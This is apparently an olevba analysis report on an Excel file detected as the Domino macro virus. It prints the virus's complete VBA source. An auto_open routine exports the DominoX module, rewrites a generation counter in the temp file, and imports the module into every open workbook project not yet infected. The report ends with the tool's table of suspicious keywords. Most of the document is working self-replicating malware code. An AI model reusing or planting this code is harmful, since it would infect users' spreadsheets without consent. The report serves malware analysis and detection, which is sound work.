olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Domino-42f5621fc4aba6f12091e479546d7767a17f278d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Domino-42f5621fc4aba6f12091e479546d7767a17f278d - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Domino-42f5621fc4aba6f12091e479546d7767a17f278d - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Domino-42f5621fc4aba6f12091e479546d7767a17f278d - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Domino-42f5621fc4aba6f12091e479546d7767a17f278d - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO DominoX.bas 
in file: Virus.MSExcel.Domino-42f5621fc4aba6f12091e479546d7767a17f278d - OLE stream: '_VBA_PROJECT_CUR/VBA/DominoX'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'NO=000000104

Option Explicit

Sub auto_open()

'On Error GoTo ActiveDomino
'Open "c:\winnt\DominoX.rmd" For Input As #1
'Close #1
'On Error GoTo 0

'MsgBox ("No Run")
'GoTo FinSub

ActiveDomino:
'On Error GoTo 0
RunDominoX

FinSub:

End Sub

Sub RunDominoX()

On Error GoTo 0

Dim NbFichiersOuverts
NbFichiersOuverts = Application.VBE.VBProjects.Count

Application.VBE.ActiveVBProject.VBComponents("DominoX").Export ("\Domino.tmp")

NumeroOrdre

Dim i, j, n, n2
        
Dim infecte
        
For i = 1 To NbFichiersOuverts

On Error GoTo erreur
    n = Application.VBE.VBProjects(i).VBComponents.Count
On Error GoTo 0
 
    
    infecte = False
    For j = 1 To n
        n2 = Application.VBE.VBProjects(i).VBComponents(j).Name
        If n2 = "DominoX" Then infecte = True
    Next j
  
    If infecte = False Then
    Application.VBE.VBProjects(i).VBComponents.Import ("\Domino.tmp")
    'MsgBox ("fichier : " & Application.VBE.VBProjects(i).Name & " infecte")
    End If
    
FichierSuivant:

On Error GoTo 0

Next i

GoTo FinSub
erreur:
Resume FichierSuivant

FinSub:
Kill ("\Domino.tmp")
End Sub



Sub NumeroOrdre()


Dim chaine As String
Dim chaineTest As String
Dim Ctr, l, i As Integer


Open "\Domino.tmp" For Input As #1
Input #1, chaine
l = Len(chaine) + 2
Input #1, chaine
Close #1


chaine = Mid(chaine, 5, 9)
Dim n
n = Val(chaine)
n = n + 1
Dim c
c = Str(n)
c = Mid(c, 2, Len(c) - 1)
chaine = Mid("000000000", 1, 9 - Len(c)) + c
chaine = "'NO=" + chaine

Dim c2 As String * 1
Open "\Domino.tmp" For Random As #1 Len = 1
    For i = l To l + Len(chaine) - 1
        c2 = Mid(chaine, i - l + 1, 1)
        Put #1, i + 1, c2
    Next i
Close #1


End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

